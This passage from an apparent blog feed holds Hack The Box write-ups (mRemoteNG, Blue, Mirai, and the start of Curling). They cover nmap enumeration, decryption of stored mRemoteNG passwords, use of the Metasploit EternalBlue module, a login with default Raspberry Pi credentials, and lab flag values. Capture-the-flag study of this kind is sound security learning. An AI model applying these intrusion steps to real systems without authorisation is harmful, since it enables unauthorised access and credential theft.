&lt;img src=&#34;/htb/ee3e7d32e7f945fabb9850e468802064.png&#34; alt=&#34;c325c4a2b2982c6e01533cf62d9ae16d.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;mremoteng-password&#34;&gt;mRemoteNG Password&lt;/h4&gt;
&lt;p&gt;While searching for the installed programs I found that mRemoteNG is installed.&lt;/p&gt;
&lt;p&gt;We find in &lt;code&gt;changelog.txt&lt;/code&gt; that the last installed version is 1.76.11.(&lt;a href=&#34;https://stackoverflow.com/questions/1295068/windows-equivalent-of-the-tail-command&#34;&gt;https://stackoverflow.com/questions/1295068/windows-equivalent-of-the-tail-command&lt;/a&gt;)
&lt;img src=&#34;/htb/06e67f1ee33744e98f837b7061079d9d.png&#34; alt=&#34;2169c9ada73afb3ab32e2aa1bdd44c5f.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;After searching for the version we find &lt;a href=&#34;https://www.reddit.com/r/mRemoteNG/comments/66hzoe/mremoteng_password_storage_is_insecure/&#34;&gt;this&lt;/a&gt; reddit post. It links to &lt;a href=&#34;https://www.reddit.com/r/mRemoteNG/comments/66hzoe/mremoteng_password_storage_is_insecure/&#34;&gt;https://www.reddit.com/r/mRemoteNG/comments/66hzoe/mremoteng_password_storage_is_insecure/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;According to the article the passwords are note saved securely. The password are saved into the folder &lt;code&gt;C:\Users\l4mpje\AppData\Roaming\mRemoteNG&lt;/code&gt;. There we find confCons.xml containing the &amp;ldquo;Protected&amp;rdquo; hash.
&lt;img src=&#34;/htb/e76a58b4b9c144579bedea17c311cf19.png&#34; alt=&#34;a0cedd422138a905e5f5017fe84cdaec.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Protected=&amp;quot;ZSvKI7j224Gf/twXpaP5 G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;I will be using this python script to decode the password.
&lt;a href=&#34;https://github.com/haseebT/mRemoteNG-Decrypt&#34;&gt;https://github.com/haseebT/mRemoteNG-Decrypt&lt;/a&gt;
I decoded all the passwords.
&lt;img src=&#34;/htb/8f60749651e0443498a731d7bfbcec93.png&#34; alt=&#34;145bed569b50b9dcc81de4b04aed5a54.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;The password recovered are: &lt;code&gt;ThisIsNotProtected&lt;/code&gt;,&lt;code&gt;bureaulampje&lt;/code&gt;,&lt;code&gt;thXLHM96BeKL0ER2&lt;/code&gt;. The last one is the administrator. Lets SSH into the Administrator&amp;rsquo;s accounts.&lt;/p&gt;
&lt;p&gt;We succesfully log in and get the root flag.&lt;/p&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;&lt;img src=&#34;/htb/cb1c818afbe34b6881c237b83c99f4c4.png&#34; alt=&#34;6b43e5c47866f87ed552ac74a362e31b.png&#34;&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Blue</title>
      <link>/hackthebox/blue/</link>
      <pubDate>Thu, 01 Apr 2021 17:04:47 +0300</pubDate>
      
      <guid>/hackthebox/blue/</guid>
      <description>Enumeration Lets begin with an nmap scan.
$ nmap -T5 10.129.23.129 -A Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-07 16:23 EST Warning: 10.129.23.129 giving up on port because retransmission cap hit (2). Nmap scan report for 10.129.23.129 Host is up (0.081s latency). Not shown: 985 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 2046/tcp filtered sdfunc 2100/tcp filtered amiganetfs 2111/tcp filtered kx 6668/tcp filtered irc 9101/tcp filtered jetdirect 34573/tcp filtered unknown 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 3s, deviation: 2s, median: 1s | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.</description>
      <content>&lt;p&gt;&lt;img src=&#34;/htb/c4d628d2f5c34692a8c8343c7fba328d.png&#34; alt=&#34;692e49c482945a2e97095e879e655505.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;p&gt;Lets begin with an nmap scan.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ nmap -T5 10.129.23.129 -A
Starting Nmap 7.91 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2021-03-07 16:23 EST
Warning: 10.129.23.129 giving up on port because retransmission cap hit &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.23.129
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.081s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;985&lt;/span&gt; closed ports
PORT      STATE    SERVICE      VERSION
135/tcp   open     msrpc        Microsoft Windows RPC
139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds Windows &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; Professional &lt;span style=&#34;color:#ae81ff&#34;&gt;7601&lt;/span&gt; Service Pack &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; microsoft-ds &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
2046/tcp  filtered sdfunc
2100/tcp  filtered amiganetfs
2111/tcp  filtered kx
6668/tcp  filtered irc
9101/tcp  filtered jetdirect
34573/tcp filtered unknown
49152/tcp open     msrpc        Microsoft Windows RPC
49153/tcp open     msrpc        Microsoft Windows RPC
49154/tcp open     msrpc        Microsoft Windows RPC
49155/tcp open     msrpc        Microsoft Windows RPC
49156/tcp open     msrpc        Microsoft Windows RPC
49157/tcp open     msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3s, deviation: 2s, median: 1s
| smb-os-discovery: 
|   OS: Windows &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; Professional &lt;span style=&#34;color:#ae81ff&#34;&gt;7601&lt;/span&gt; Service Pack &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Windows &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; Professional 6.1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
|   Workgroup: WORKGROUP&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
|_  System time: 2021-03-07T21:24:49+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-07T21:24:47
|_  start_date: 2021-03-07T21:20:41

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 79.23 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We notice that SMB is open.&lt;/p&gt;
&lt;h2 id=&#34;smb-enumeration&#34;&gt;SMB Enumeration&lt;/h2&gt;
&lt;p&gt;By using nmap we find that this machine is vulnerable to the Eternal Blue exploit.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ nmap --script smb-vuln-ms17-010 -p 139,445 10.129.23.129                                         
Starting Nmap 7.91 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2021-03-07 16:31 EST
Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.23.129
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.080s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ms17-010&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ms17-010&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;CVE-2017-0143

Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 2.03 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;exploitation-with-eternal-blue&#34;&gt;Exploitation with Eternal Blue&lt;/h1&gt;
&lt;p&gt;Using metasploit we can select the eternal blue exploit (exploit/windows/smb/ms17_010_eternalblue).
After setting the rhost,lhost and typing run we successfully get a meterpreter session and shell as system&amp;hellip;&lt;/p&gt;
&lt;p&gt;And get of both flags:
&lt;img src=&#34;/htb/25cc0c8696304de78e9c3c8f37fa100c.png&#34; alt=&#34;00c7f887d5c8fec0f86ce7c48f3aeecc.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/htb/1dd4fbc87cb248afad8bae5cb3a2f7a7.png&#34; alt=&#34;5daf5f2cd9227777cbb3accbaa883bc1.png&#34;&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Mirai</title>
      <link>/hackthebox/mirai/</link>
      <pubDate>Thu, 01 Apr 2021 17:04:25 +0300</pubDate>
      
      <guid>/hackthebox/mirai/</guid>
      <description>Enumeration We will start with an nmap scan of the machine:
$ nmap -sC -sV 10.129.70.227 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-21 16:24 UTC Nmap scan report for 10.129.70.227 Host is up (0.023s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0) | ssh-hostkey: | 1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA) | 2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA) | 256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA) |_ 256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519) 53/tcp open domain dnsmasq 2.</description>
      <content>&lt;p&gt;&lt;img src=&#34;/htb/3784ff8e06d04f44a36f054fb0ae0afe.png&#34; alt=&#34;94b0478942e1eefe5f77a3581275f4eb.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;p&gt;We will start with an nmap scan of the machine:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ nmap -sC -sV 10.129.70.227
Starting Nmap 7.80 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2020-12-21 16:24 UTC
Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.70.227
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.023s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;996&lt;/span&gt; closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt; aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;DSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
53/tcp   open  domain  dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp   open  http    lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Site doesn&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;text/html; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;UTF-8&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
1132/tcp open  upnp    Platinum UPnP 1.0.5.13 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;UPnP/1.0 DLNADOC/1.50&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 20.40 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We notice that there is an SSH service running, a DNS caching server (dnsmasq), a webpage (lighttpd) and a upnp service.&lt;/p&gt;
&lt;p&gt;We used some common subdirectory names such as administrator, robots.txt and admin and found this landing page at &lt;code&gt;/admin&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/htb/549bee1b286848bfae8322a7627c831a.png&#34; alt=&#34;340aa674a723210f76961f9665096f4b.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Pihole is a DNS ad blocker that is designed for raspberry pi devices. Raspberry pi has default credentials &lt;code&gt;pi&lt;/code&gt;:&lt;code&gt;raspberry&lt;/code&gt;. We can try to login with the password &lt;code&gt;raspberry&lt;/code&gt;, but it fails.&lt;/p&gt;
&lt;h1 id=&#34;ssh-using-the-pi-account&#34;&gt;SSH using the pi account&lt;/h1&gt;
&lt;p&gt;We can try to login into ssh with the default credentials.:
&lt;img src=&#34;/htb/6c1629537def44568bfe6831edd0e6b1.png&#34; alt=&#34;ca5a340c41762e562d0b5b47cb31d5f7.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;We currently are user &lt;code&gt;pi&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;And we get user.txt:
&lt;img src=&#34;/htb/8aa45ca164ba4d7c8ce918c14eba308a.png&#34; alt=&#34;229ea9c83663f54e43e61a7a8026e3d4.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;user.txt:&lt;code&gt;ff837707441b257a20e32199d7c8838d&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
&lt;p&gt;We now need to priviledge escalate to root. We can run &lt;code&gt;sudo -l&lt;/code&gt; to check what commands can be run by the user with root permission.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/htb/ce7ead7154994f4682799bf918968f1d.png&#34; alt=&#34;38616ea6b389139cdeb7d70464f13664.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;All commands can be run with sudo, so lets create a shell using &lt;code&gt;sudo -i&lt;/code&gt;:
&lt;img src=&#34;/htb/b92932ea45a84c2ea69f76595184cc28.png&#34; alt=&#34;5d49ccbb7c2f007cb485b1c4687b0888.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Unfortunately root.txt has been lost and a backup may exist on a USB stick.&lt;/p&gt;
&lt;h1 id=&#34;searching-for-the-deleted-roottxt&#34;&gt;Searching for the deleted root.txt&lt;/h1&gt;
&lt;p&gt;We should check &lt;code&gt;lost+found&lt;/code&gt; for deleted files.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;lost+found&lt;/code&gt; folder is occupied by unlinked files that while they were deleted the system crashed. In our case no files were found:
&lt;img src=&#34;/htb/269d5a77e4c3418f8db0c038ee43686a.png&#34; alt=&#34;3b31dbb29ccb86e96176135cfb6df927.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can look at /mnt to see if a USB stick is attached:
&lt;img src=&#34;/htb/587d7926d72d4d0f9f4e522515c96aee.png&#34; alt=&#34;131efb1f1aa1858a51c97c6a1563dd9b.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Unfortunately no external storage device is mounted to /mnt. Lets run &lt;code&gt;lsblk&lt;/code&gt; to show all partitions connected to the file system:
&lt;img src=&#34;/htb/6f9b82fce25f4e6ab57fd2a961003ec6.png&#34; alt=&#34;bc3778bb9e02fc0a7ce8200728061ff7.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;It turns out that the USB stick is mounted under &lt;code&gt;/media/usbstick&lt;/code&gt;.
&lt;img src=&#34;/htb/930c559e68a042b5a50a00bc86e48672.png&#34; alt=&#34;9c0cab56cbd3e6d0bd443970f689613f.png&#34;&gt;
The file has been deleted from the USB Stick, so lets try to recover it.
The usb stick has been assigned the name &lt;code&gt;sdb&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The data block &lt;code&gt;/dev/sdb&lt;/code&gt; is assigned to the USB . Lets search for ASCII data inside the block. If we use strings on the file, we get the root flag. In our case &lt;code&gt;cat /dev/sdb&lt;/code&gt; simply worked.
&lt;img src=&#34;/htb/3dfb3ea61dcf40978bcc8a4ccfc3afc6.png&#34; alt=&#34;400b4c6a0a86c9b1ad989c51f625bbe8.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;root.txt:&lt;code&gt;3d3e483143ff12ec505d026fa13e020b&lt;/code&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Curling</title>
      <link>/hackthebox/curling/</link>
      <pubDate>Thu, 01 Apr 2021 17:04:19 +0300</pubDate>
      
      <guid>/hackthebox/curling/</guid>
      <description>Enumeration First of all lets use nmap to scan the machine:
$ nmap -sC -sV 10.129.58.119 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-01 05:27 EST Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.28% done; ETC: 05:27 (0:00:00 remaining) Nmap scan report for 10.129.58.119 Host is up (0.096s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.</description>
      <content>&lt;p&gt;&lt;img src=&#34;/htb/d4ac30640dff4503a64dc77f623a65e8.png&#34; alt=&#34;d4ac30640dff4503a64dc77f623a65e8.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;p&gt;First of all lets use nmap to scan the machine:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ nmap -sC -sV  10.129.58.119            
Starting Nmap 7.91 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2020-12-01 05:27 EST
Stats: 0:00:11 elapsed; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; hosts completed &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; undergoing Script Scan
NSE Timing: About 99.28% &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;; ETC: 05:27 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0:00:00 remaining&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.58.119
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.096s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;joomla-enumeration&#34;&gt;Joomla Enumeration&lt;/h4&gt;
&lt;p&gt;If we use google we can find that the admin page for joomla is at &lt;code&gt;/administator&lt;/code&gt; :
&lt;img src=&#34;/htb/9836793dc64b4d608935dc8402ef49af.png&#34; alt=&#34;e7e545304b2fa4abc15b27ff74ac64a7.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Moreover we can use &lt;code&gt;administrator/manifests/files/joomla.xml&lt;/code&gt; to find the Joomla version.
&lt;img src=&#34;/htb/7b91b706167944dc8718eb8731ea76f7.png&#34; alt=&#34;6a911c1a17746c578919d3d4bfdf19ba.png&#34;&gt;
We can see the files of the server too.
&lt;img src=&#34;/htb/e6d92f9a5a054179a969df9fa1f7189d.png&#34; alt=&#34;3b1601e4abbf4d8a22a1ec2686677dc2.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;While searching for exploits I found CVE-2018-12712. But it is for privesc, so we might use that later.&lt;/p&gt;
&lt;h4 id=&#34;secrettxt-file&#34;&gt;secret.txt file&lt;/h4&gt;
&lt;p&gt;If we check the code of the main page we can find:
&lt;img src=&#34;/htb/40bcb9e691e240bd9201e112fb1e0a24.png&#34; alt=&#34;d5bee1e0345ea1c1c6ee313054f618c2.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Lets visit /secret.txt:
&lt;img src=&#34;/htb/fd5eadba91e9455b8b2f58558d957766.png&#34; alt=&#34;0b878adadadec1b458d9af3f043fd237.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;It seems like a hash. After some searching I found that it is a base64 hash, decoded: &lt;code&gt;Curling2018!&lt;/code&gt;
&lt;img src=&#34;/htb/5707916f703a4815af2647c30dc50e76.png&#34; alt=&#34;bf02ba914256eee3d5a661aac22a59a3.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;username-find-via-the-blog-and-admin-login&#34;&gt;Username Find via the blog and admin login&lt;/h4&gt;
&lt;p&gt;Ιf we search the blog posts we see that someone named &lt;code&gt;Floris&lt;/code&gt; posts content:
&lt;img src=&#34;/htb/6612a0f22cb34c75868553b4a50e05d8.png&#34; alt=&#34;94de080494d7bb2e05a42733baa8a2d2.png&#34;&gt;
&lt;em&gt;(Also subtle hint for password)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;We can login in &lt;code&gt;/administrator/&lt;/code&gt; using username &lt;code&gt;Floris&lt;/code&gt; and password &lt;code&gt;Curling2018!&lt;/code&gt; . We are &amp;ldquo;Super User&amp;rdquo;.
&lt;img src=&#34;/htb/0ab79bb632ae451b9e95d9aa9727a076.png&#34; alt=&#34;64a49d847a155b9b145c30924d07112e.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;reverse-shell-with-php-code&#34;&gt;Reverse shell with PHP code&lt;/h1&gt;
&lt;p&gt;Now lets get a reverse shell. First of all go to the Templates menu:
&lt;img src=&#34;/htb/d6208101424a456ab0f8292a02c5cd75.png&#34; alt=&#34;6e899eb11aec86617ccc612e7f82f86a.png&#34;&gt;&lt;/p&gt;
